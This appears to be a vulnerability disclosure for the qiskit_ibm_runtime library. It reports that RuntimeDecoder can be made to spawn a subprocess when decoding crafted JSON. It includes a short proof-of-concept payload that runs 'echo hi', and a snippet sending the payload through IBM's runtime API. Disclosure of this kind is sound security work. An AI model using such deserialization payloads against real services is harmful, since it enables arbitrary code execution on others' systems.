summary: |
  `qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code
  ### Summary

  deserializing json data using `qiskit_ibm_runtime.RuntimeDecoder` can be made to execute arbitrary code given a correctly formatted input string

  ### Details

  `RuntimeDecoder` is supposed to be able to deserialize JSON strings containing various special types encoded via `RuntimeEncoder`. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159

  ### PoC

  ```python
  malicious_data = {
      "__type__": "settings",
      "__module__": "subprocess",
      "__class__": "Popen",
      "__value__": {
          "args": ["echo", "hi"]
      },
  }
  json_str = json.dumps(malicious_data)

  _ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
  ```
  (where obviously "echo hi" can be replaced with something much more malicious)

  notably the following also makes it through the runtime API, with `malicious_data` serialized client-side via `RuntimeEncoder` (and therefore presumably deserialized server-side via `RuntimeDecoder`?)
  ```python
  service = qiskit_ibm_runtime(<ibm_cloud_credentials>)
  job = service.run("qasm3-runner", malicious_data)
  print(job.status())  # prints "JobStatus.QUEUED"
  ```

  ### Impact

  i don't know if `qiskit_ibm_runtime.RuntimeDecoder` is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)
